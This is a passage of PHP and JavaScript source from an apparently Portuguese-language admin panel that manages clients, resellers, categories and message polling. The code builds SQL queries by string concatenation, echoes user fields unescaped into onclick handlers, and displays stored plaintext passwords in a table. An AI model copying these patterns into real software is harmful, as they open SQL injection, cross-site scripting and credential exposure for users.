                       ihtml = ihtml.replaceAll('id_mensagem', mensagem.id_mensagem);
                       ihtml = ihtml.replaceAll('titulo_mensagem', mensagem.titulo);
                       ihtml = ihtml.replaceAll('texto_mensagem', mensagem.mensagem);
                       ihtml = ihtml.replaceAll('data_mensagem', mensagem.data);
                       mHTML += ihtml + '\n';
                   });
                   $('#event_' + nome + ' .todas_mensagens').prepend(mHTML);
               }
               if(novas_mensagens.length > 0){
                   var oldNotRead = 0;
                   $('div[mensagem-id][class*="unread"]').each(function (){
                    	var found = false;
                    	var mid = $(this).attr('mensagem-id');
                    	novas_mensagens.forEach((mensagem) => {
                    	    if(mensagem.id_mensagem == mid)
                    	        found = true;
                    	});
                    	if(!found)
                    	    oldNotRead++;
                   });
                   var total_not_read = oldNotRead + novas_mensagens.length;
                   $('#event_' + nome + ' .novas_mensagens').text(total_not_read + ' Novas mensagens');
               }
            });
            reload(); reload();
            swal("Nova mensagem", " Você recebeu uma nova mensagem!", "success");
            document.getElementById("new_msg").play();
        }, 2000);
    }
    setInterval(function(){
        $.get('/controles/verificar-mensagens.php', function(msgs){
            msgs = JSON.parse(msgs);
            if(parseInt(msgs.length) > msg)
                novasMensagens(msgs);
        });
    }, 1000);
    $.get('/controles/verificar-mensagens.php', function(msgs){
        msgs = JSON.parse(msgs);
        var naolida = 0;
        msgs.forEach((msg) => {
            if(msg.lida !== 'sim')
                naolida++;
                
            if(naolida > 0){
                reload(); reload();
                swal("Nova mensagem", " Você recebeu uma nova mensagem!", "success");
            }
        })
    });
</script>

<div class="DashboardContainer"></div>
<script src="js/uppy.io.js"></script>
<main class="page-content">
<div class="container-fluid">
/categoria.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/categorias.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$categorias = false;
if($_SESSION['admin']){
    $categorias = listarCategorias();
}
?>
	<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" class="container">
<?php if ($categorias) { ?>
                <div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
                <table class='table table-bordered table-hover'>
                    <caption>Categorías</caption>
                    <thead class="thead-light">
                        <tr align="center">
                            <th class='nomecol' scope="col" >Nome</th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='semresultado' scope='col'>Nenhum resultado</th>
                        </tr>
                    </thead>
                <tbody id="conteudo">
<?php foreach($categorias as $categoria) { ?>
                        <tr align="center">
                            <td> <?=$categoria['nome']?> </td>
                            <td>
                                <button class='btn btn-outline-danger' onclick="removerConfirma('<?=$categoria['id']?>','<?=$categoria['nome']?>')"><i class="far fa-trash-alt"></i></button>
                            </td>
                            <td>
                                <button class='btn btn-outline-secondary' onclick="editarConfirma('<?=$categoria['id']?>','<?=$categoria['nome']?>')"><i class="fas fa-edit"></i></button>
                            </td>
                        </tr>
<?php } ?>
                    </tbody>
                </table>
        <?php
        }
        ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
                <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
            </div>
        </div>
    </div>

  </main>
  <!-- page-content" -->
</div>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Adicionar Categoria</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome da categoria" required autofocus>
                    <small class="form-text text-muted">Campo único!</small>
                </div>
                <button type="submit" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Categoria</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome da Categoria" required autofocus>
                </div>
                <button type="submit" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
</body>
<script>
    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

    function editarConfirma(id,nome) {
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#editar').modal();
    }

    function remover(id) {
        $.ajax({
            type: "POST",
            url: "controles/remover-categoria.php",
            data: {id: id},
            success: function(data) {
                location.reload();
            }
        });
    }

    $( "#cadastro-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/adicionar-categoria.php",
            data: $("#cadastro-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function(data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

    $( "#editar-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/editar-categoria.php",
            data: $("#editar-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function(data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

</script>
<?php require_once("comum.php");
require_once("alerta.php"); ?>
</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/cliente.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/listas.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$usuarios = listarUsuarios();
$listas = listarListas();
$buscar = ("SELECT * FROM usuario WHERE id_criador = ".$_SESSION['id_usuario']." AND dia = 31");
$resut = mysqli_query($conexao, $buscar);
$credito = mysqli_num_rows($resut);
$buscar = "SELECT * FROM usuario WHERE id_usuario = ".$_SESSION['id_usuario']."";
$resut = mysqli_query($conexao, $buscar);
while($usuario = mysqli_fetch_array($resut)){
$creditos = $credito;
$credito = $usuario['credito'];}
?>
<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" style="padding-left: 0px;" class="table-responsive container">
			<?php if ($usuarios) { ?>
                <div class="mb-5 form-group float-right">
                </div>
				<div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
				<table class='table table-bordered table-hover'>
                    <caption>Usuários</caption>
				<thead class="thead-light">
					<tr align="center">
						<th class='nomecol' style="width: 10%" scope="col">Nome</th>
						<th class='nomecol' style="width: 5%" scope="col">Login</th>
						<th class='nomecol' style="width: 5%" scope="col">Senha</th>
						<th class='nomecol' style="width: 1%" scope="col">Conexão</th>
						<th class='nomecol' style="width: 5%" scope="col">Criador</th>
                        <th class='nomecol' style="width: 5%" scope="col">Estado</th>
                        <th class='nomecol' style="width: 12%" scope="col">Listas</th>
						<th class='nomecol' style="width: 10%" scope="col">Expirar</th>
						<th class='nomecol' style="width: 5%" scope="col">Opções</th>
					</tr>
				</thead>
                <tbody id="conteudo">
					<?php foreach($usuarios as $usuario) { ?>
					<?php
					if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
					$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
					}
					$ip = $_SERVER["REMOTE_ADDR"];
					$logs = ("SELECT * FROM logs WHERE id_usuario = ".$usuario['id_usuario']." AND ip = '$ip' limit 1");
					$resut = mysqli_query($conexao, $logs);
					$log = mysqli_num_rows($resut);
					?>
                    <?php if ($usuario['dia'] == 31){ ?>
					<?php if ($usuario['admin'] == 0) if ($usuario['vendedor'] == 0) { ?>
					<?php
					$hoje = date('Y-m-d');
					$data = $usuario['data'];
					$a = explode("-","$data");
					$b = explode("-","$hoje");
					$antiga= mktime(0, 0, 0, $b[1], $b[2], $b[0]);
					$atual= mktime(0, 0, 0, $a[1], $a[2], $a[0]);
					$diferenca= $atual-$antiga;
					$datas = floor($diferenca/84600);
				    $data1 = "1"; $data2 = $datas;
					if($data1 <= $data2){
					$id_usuario = $usuario['id_usuario'];
					$estado = "1";
					$result = "UPDATE usuario SET estado_usuario='$estado' WHERE id_usuario='$id_usuario'";
					$atualiza = mysqli_query($conexao, $result);
					} else {
					$id_usuario = $usuario['id_usuario'];
					$estado = "0";
                    $tipo = "0";
					$result = "UPDATE usuario SET vendedor='$tipo', admin='$tipo', estado_usuario='$estado' WHERE id_usuario='$id_usuario'";
					$atualiza = mysqli_query($conexao, $result);}
					?>
					<?php
                    $passwords = "SELECT * FROM passwords WHERE id_usuario = ".$usuario['id_usuario']."";
                    $resut = mysqli_query($conexao, $passwords);
                    while($password = mysqli_fetch_array($resut)){
					?>
					<tr>
							<td align="center"> <?=$usuario['nome_usuario']?> </td>
							<td align="center"> <?=$usuario['login_usuario']?> </td>
							<td align="center"> <?php echo $password['senha']; ?> </td>
							<td align="center"> <?php if ($usuario['conectado'] == 0) {echo "Ilimitada";} else {echo "".$log." / ".$usuario['conectado']."";} ?> </td>
							<td align="center"> <?php echo $usuario['criador'] ? $usuario['criador']['nome_usuario'] : 'Sistema'; ?> </td>
                            <td align="center"> <?php if($datas1 <= $datas2){ echo "Ativado"; } else { echo "Desativado"; } ?> </td>
							<td align="center"> <?php foreach (listasUsuario($usuario["id_usuario"]) as $lista) echo '[ '.$lista['nome_lista'].' ]'; ?> </td>
							<td align="center"> <?php if($datas1 <= $datas2){ echo "Dia ".$datas.""; } else { echo "Expirou Dia ".$usuario["dia"].""; } ?> </td>
							<td style="display: contents;">
								<div class="dropdown">
									<style>.no-zero { padding-top: 0px; padding-bottom: 0px; position: relative; }</style>
									<button class="btn" type="button" data-toggle="dropdown" aria-expanded="false" style="top: 3px; margin: 0 auto; position: relative; display: block">Opções<span class="fa fa-caret-down" style="left: 4px; position: relative" aria-hidden="true"></span></button>
									<style>.pointer { cursor: pointer; border:none }</style>
									<ul class="no-zero dropdown-menu pointer" x-placement="bottom-start">
										<li align="center"><a  class='btn btn-outline-secondary' onclick="editarConfirma('<?php echo $usuario['dia']; ?>', '<?=$usuario['id_usuario']?>','<?=$usuario['nome_usuario']?>','<?=$usuario['conectado']?>','<?=$usuario['login_usuario']?>','<?=$usuario['estado_usuario']?>','<?php echo $password['senha']; ?>', '<?=$usuario['vendedor']?>', [<?php foreach (listasUsuario($usuario['id_usuario']) as $lista) echo $lista['id_lista'] .',' ?> ])" style="width: 100%;display: block;padding: 5px;top: -10px;"><i class="fas fa-user-edit"></i> Editar</a></li>
										<li align="center"><a  class='btn btn-outline-secondary' onclick="verLogs('<?=$usuario['id_usuario']?>')" style="width: 100%; display: block; padding: 5px"><i class="fas fa-clipboard-list"></i> Logs</a></li>
										<li align="center"><a  class='btn btn-outline-secondary' onclick="removerConfirma('<?=$usuario['id_usuario']?>', '<?=$usuario['nome_usuario']; ?>')" style="width: 100%; display: block; padding: 5px"><i class="far fa-trash-alt"></i> Excluir</a></li>
									</ul>
								</div>
							</td>
						</tr>
					<?php } ?>
					<?php } ?>
					<?php } ?>
					<?php } ?>
				</tbody>
			</table>
        <?php
        }
        ?>
		  <?php if($_SESSION['admin']) { ?>
             <div class="h3 mt-5 row align-items-center justify-content-center">
             <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-user-plus"></i>
          <?php } ?>
		  <?php if($_SESSION['vendedor']) { ?>
		  <?php if($creditos <= $credito){ ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
            <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-user-plus"></i>
          <?php } ?>
          <?php } ?>
            </div>
        </div>
    </div>
  </main>
<!-- page-content" -->
</div>
<?php if($_SESSION['admin']) { ?>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="TituloModalLongoExemplo">Adicionar Usuário</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" value="<?php $gerador = rand(8,8); $valor = substr(str_shuffle("abcdefghijlkmnopqrstuvxyzwABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $gerador); echo $valor; ?>">
                    <small class="form-text text-muted">Deixa gerar um nome automático se não quiser colocar</small>
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" name="login" placeholder="Login" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar um login automático se não quiser colocar</small>
                </div>
                <div id="sC">
                    <div id="divSenhaC" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" name="senha" placeholder="Senha" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar uma senha automático se não quiser colocar</small>
                </div>
                </div>
			   <?php if($_SESSION['admin']) { ?>
                <div class="form-group">
                    <label>Máximo de Conexão:</label>
                    <input type="number" class="form-control" name="conectado" value="0">
					<small class="form-text text-muted">Deixar gerar valor zero e como acesso simultâneo ilimitado</small>
               </div>
			   <?php } ?>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelC" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
							<option value="admin" hidden></option>
                            <option value="vendedor" hidden></option>
							<option value="cliente">Cliente</option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select value="0" id="adminC" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select value="0" id="vendedorC" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="addForce()" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<?php } ?>
<?php if($_SESSION['vendedor']) { ?>
<?php if($creditos <= $credito){ ?>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="TituloModalLongoExemplo">Adicionar Usuário</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" value="<?php $gerador = rand(8,8); $valor = substr(str_shuffle("abcdefghijlkmnopqrstuvxyzwABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $gerador); echo $valor; ?>">
                    <small class="form-text text-muted">Deixa gerar um nome automático se não quiser colocar</small>
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" name="login" placeholder="Login" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar um login automático se não quiser colocar</small>
                </div>
                <div id="sC">
                    <div id="divSenhaC" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" name="senha" placeholder="Senha" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar uma senha automático se não quiser colocar</small>
                </div>
                </div>
			   <?php if($_SESSION['vendedor']) { ?>
                <div class="form-group" hidden>
                    <label></label>
                    <input type="number" class="form-control" name="conectado" value="1">
               </div>
			   <?php } ?>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelC" class="selectpicker" title="Nível">
                            <?php if($_SESSION['vendedor']) { ?>
							<option value="admin" hidden></option>
                            <option value="vendedor" hidden></option>
							<option value="cliente">Cliente</option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select value="0" id="adminC" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select value="0" id="vendedorC" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="addForce()" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<?php } ?>
<?php } ?>
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<?php if($_SESSION['admin']) { ?>
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Usuário</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome">
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" id="loginE" name="login" placeholder="Login">
                </div>
                <div id="s">
                <div id="divSenha" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" id="SenhaE" name="senha" placeholder="Senha">
                    </div>
                </div>
			   <?php if($_SESSION['admin']) { ?>
                <div class="form-group">
                    <label>Máximo de Conexão:</label>
                    <input type="number" class="form-control" id="TelaE" name="conectado">
               </div>
			   <?php } ?>
               <div class="form-group">
                    <label>Estado:</label>
                    <div class="ml-0 row">
                        <select id="estadoE" class="selectpicker" title="Estado" name="estado">
                            <option value="1">Ativo</option>
                            <option value="0">Desativado</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelE" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
                            <option value="cliente">Cliente</option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select id="adminE" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select id="vendedorE" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="forceEdit()" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
<?php } ?>
<?php if($_SESSION['vendedor']) { ?>
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Usuário</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
			    <?php if($_SESSION['vendedor']) { ?>
                <input id="conectado" name="conectado" type="hidden" value="1">
                <?php } ?>
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome">
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" id="loginE" name="login" placeholder="Login">
                </div>
                <div id="s">
                <div id="divSenha" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" id="SenhaE" name="senha" placeholder="Senha">
                    </div>
                </div>
               <div class="form-group">
                    <label>Estado:</label>
                    <div class="ml-0 row">
                        <select id="estadoE" class="selectpicker" title="Estado" name="estado">
                            <option value="1">Ativo</option>
                            <option value="0">Desativado</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelE" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
                            <option value="cliente">Cliente</option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select id="adminE" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select id="vendedorE" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="forceEdit()" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
<?php } ?>
</body>
<script>
    var clone = $("#divSenha").clone();
    var cloneC = $("#divSenhaC").clone();
    //$("#divSenhaC").remove();

    $("#cadastro").on('hidden.bs.modal', function (e) {
        if ($( "#adminC" ).val() != 1) {
            //$("#sC").empty();//DO_NOTHING
        }
    });

    $( "#adminC" ).change(function() {
        if ($( "#adminC" ).val() == 1) {
            $("#sC").append(cloneC);
        } else {
            $("#sC").empty();
        }
    });

    function editarConfirma(dia, id,nome,contato,login,estado,admin, vendedor, lista) {
	if(parseInt(dia) > 0){
	   $('#dia').val(parseInt(dia));
	} else {
	   $('#dia').val('');
	}
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        setTimeout(() => {
            $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
            $('*[data-id=nivelE]').text(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        }, 500);
        $('#TelaE').val(contato);
        $('#loginE').val(login);
        $('#estadoE').val(estado);
        $('#estadoE').selectpicker('render');
        $('#SenhaE').val(admin);
        $('#adminE').selectpicker('render');
        if (parseInt(admin) == 0) {
	    console.log(parseInt(vendedor) !== 1);
	    if(parseInt(vendedor) !== 1){
		$('#exdiaE').show();
		$('#CreditoC').show();
		$('#ConectadoE').show();
	    } else {
		$('#exdiaE').hide();
		$('#CreditoE').hide();
		$('#ConectadoE').hide();
	    }
            //$('#divSenha').remove();
        } else if ($('#divSenha').length < 1) {
            $('#s').append(clone);
        }
        $('#listaE').val(lista);
        $('#listaE').selectpicker('render');
        $('#editar').modal();
    }

    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

	function remover(id){
        window.location.href = 'controles/remover-cliente.php?id_usuario=' + id;
    }

    var addForce = function(){
        $( "#cadastro-form" ).trigger('submit');
    };
    var added = false;
    $( "#cadastro-form" ).submit(function( event ) {
        if(!added){
            added = true;
            if($('#cadastro-form select[name="vendedor"]').val().trim() == ""){
                $('#cadastro-form select[name="vendedor"]').val(0);
            }
            if($('#cadastro-form select[name="admin"]').val().trim() == ""){
                $('#cadastro-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/adicionar-cliente.php",
                data: $("#cadastro-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    var eddited = false;
    var forceEdit = function(){
        $( "#editar-form" ).trigger('submit');
    }
    $( "#editar-form" ).submit(function( event ) {
        if(!eddited){
            eddited = true;
            if($('#editar-form select[name="vendedor"]').val().trim() == ""){
                $('#editar-form select[name="vendedor"]').val(0);
            }
            if($('#editar-form select[name="admin"]').val().trim() == ""){
                $('#editar-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/editar-cliente.php",
                data: $("#editar-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    <?php if($_SESSION['admin']) { ?>
	  $('#vendedorC').val(0);
      $('#adminC').val(1);
    <?php } ?>

    $('#nivelC').on('change', function(){
       var value = $(this).val();
       $('#sC').empty();
       if(value == 'vendedor'){
           $('#adminC').val(0);
           $('#vendedorC').val(1);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
	   $('#CreditoC').val(1);
       } else if (value == 'admin'){
           $('#adminC').val(1);
           $('#vendedorC').val(0);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
	   $('#CreditoC').val(0);
       } else {
           $('#adminC').val(0);
           $('#vendedorC').val(0);
	   $("#sC").append(cloneC);	   
	   $('#exdiaC').show();
	   $('#ConectadoC').show();
	   $('#CreditoC').val(0);
       }
    });

function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}
    function logar(id){
	if(!getCookie('original')){
	   setCookie('original', <?php echo $_SESSION['id_usuario'] ?>, 1);	
	}
	$.get('controles/forcar-login.php?id_usuario=' + id, function(){
	   window.location.reload();
        });
    }
    function verLogs(id){
        window.location.href = 'log.php?id_usuario=' + id;
    }
    $('#nivelE').on('change', function(){
       var value = $(this).val();
       if(value == 'vendedor'){
           $('#adminE').val(0);
           $('#vendedorE').val(1);
           $("#s").append(clone);
	   $('#exdiaE').hide();
	   $('#CreditoE').hide();
	   $('#ConectadoE').hide();
       } else if (value == 'admin') {
           $('#adminE').val(1);
           $('#vendedorE').val(0); 
